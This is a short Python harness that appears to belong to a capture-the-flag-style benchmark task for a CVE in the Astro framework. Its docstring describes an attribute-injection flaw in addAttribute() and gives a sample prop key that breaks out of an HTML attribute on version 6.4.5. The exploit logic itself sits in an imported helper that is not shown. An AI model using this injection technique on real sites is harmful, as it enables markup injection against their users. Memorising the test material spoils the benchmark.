#!/usr/bin/env python3
"""[GIVEN] CVE-2026-54298 seed exploit for astro-cve-2026-59729.

Spread-prop attribute names are interpolated into HTML without escaping by
addAttribute(). On v0 (6.4.5) a prop key like `x" data-pcb="<FLAG>` breaks out of
the attribute; on v1 (6.4.6+) the INVALID_ATTR_NAME_CHAR guard drops it
(CVE-2026-54298 fix).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import astro_util as u  # noqa: E402


def candidate(*, version="v1", flag=None):
    r = u.exploit(version, "seed")
    return {"ok": (flag and r.get("flag") == flag) or bool(r.get("flag")), "flag": r.get("flag", "")}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
